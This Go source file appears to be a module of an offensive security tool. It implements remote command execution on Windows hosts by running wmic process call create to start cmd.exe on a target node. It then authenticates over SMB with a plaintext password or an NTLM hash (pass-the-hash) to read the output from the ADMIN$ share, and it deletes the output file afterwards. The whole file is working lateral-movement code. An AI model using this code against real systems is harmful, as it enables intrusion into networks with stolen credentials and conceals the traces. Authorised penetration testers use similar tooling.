//go:build windows
// +build windows

package exectools

import (
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/hirochachacha/go-smb2"
	"golang.org/x/sys/windows"
)

func ReadFileOnShare(machine, user, pass, domain, shareName, fileToRead string) (string, error) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", machine))
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	var d *smb2.Dialer
	if len(pass) == 32 {
		pass, err := hex.DecodeString(pass)
		if err != nil {
			return "", err
		}
		d = &smb2.Dialer{
			Initiator: &smb2.NTLMInitiator{
				Domain: domain,
				User:   user,
				Hash:   pass,
			},
		}
	} else {
		d = &smb2.Dialer{
			Initiator: &smb2.NTLMInitiator{
				Domain:   domain,
				User:     user,
				Password: pass,
			},
		}
	}
	s, err := d.Dial(conn)
	if err != nil {
		return "", err
	}
	defer s.Logoff()
	share, err := s.Mount(fmt.Sprintf("\\\\%s\\%s", machine, shareName))
	if err != nil {
		return "", err
	}
	defer share.Umount()
	f, err := share.Open(fileToRead)
	if os.IsNotExist(err) {
		return "", errors.New("File doesnt exist.")
	}
	f.Close()
	data, err := share.ReadFile(fileToRead)
	if err != nil {
		return "", err
	}
	err = share.Remove(fileToRead)
	if err != nil {
		return fmt.Sprintf("ERROR: %v Failed to delete file but still got output.\n%s", err, string(data)), nil
	}
	return string(data), nil
}

func WmiExec(args []string) (string, error) {
	if len(args) < 4 {
		return "", errors.New("Not Enough Args.")
	}
	node := args[0]
	userName := args[1]
	userSlice := strings.Split(userName, "\\")
	if len(userSlice) < 2 {
		return "", errors.New("User Format Must Be DOMAIN\\User")
	}
	domain := userSlice[0]
	userName = userSlice[1]
	passwordOrHash := args[2]
	command := args[3]
	binaryName, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\wbem\\wmic.exe")
	wmicArgs := make([]string, 0)
	wmicArgs = append(wmicArgs, "C:\\Windows\\System32\\wbem\\wmic.exe")
	wmicArgs = append(wmicArgs, fmt.Sprintf("/node:%s", node))
	wmicArgs = append(wmicArgs, "process")
	wmicArgs = append(wmicArgs, "call")
	wmicArgs = append(wmicArgs, "create")
	wmicArgs = append(wmicArgs, `"cmd.exe`)
	wmicArgs = append(wmicArgs, "/q")
	wmicArgs = append(wmicArgs, "/c")
	wmicArgs = append(wmicArgs, command)
	wmicArgs = append(wmicArgs, "1>")
	wmicArgs = append(wmicArgs, "\\\\localhost\\ADMIN$\\wmic_svc_stderr.log")
	wmicArgs = append(wmicArgs, `2>&1"`)
	commandLine, err := windows.UTF16PtrFromString(strings.Join(wmicArgs, " "))
	if err != nil {
		return "", err
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	err = windows.CreateProcess(binaryName, commandLine, nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, &si, &pi)
	if err != nil {
		return "", err
	}
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
	time.Sleep(time.Second * 5)
	output, err := ReadFileOnShare(node, userName, passwordOrHash, domain, "ADMIN$", "wmic_svc_stderr.log")
	if err != nil {
		return "", err
	}
	return output, nil
}
